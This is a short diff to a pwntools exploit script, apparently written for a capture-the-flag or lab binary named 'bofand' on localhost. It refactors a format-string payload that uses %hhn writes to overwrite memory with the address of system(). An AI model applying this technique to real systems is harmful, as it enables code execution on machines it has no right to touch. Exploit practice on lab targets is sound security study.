@@ -1,5 +1,4 @@
 from pwn import *
-import math
 
 binary_name = "./bofand"
 remote_name = "localhost"
@@ -31,7 +30,7 @@ stack_arg_offset = arg_offset + fsa_len // 8
 for i, x in enumerate(p64(system_addr)[:3]):
     payload += f"%{x}c%{i+stack_arg_offset}$hhn%{256-x}c".encode("utf-8")
 
-payload += b"A" * (math.floor(len(payload) / 8) * 8 - len(payload))
+payload += b"A" * ((len(payload) // 8) * 8 - len(payload))
 # print(hex(len(payload)))
 
 assert len(payload) < fsa_len
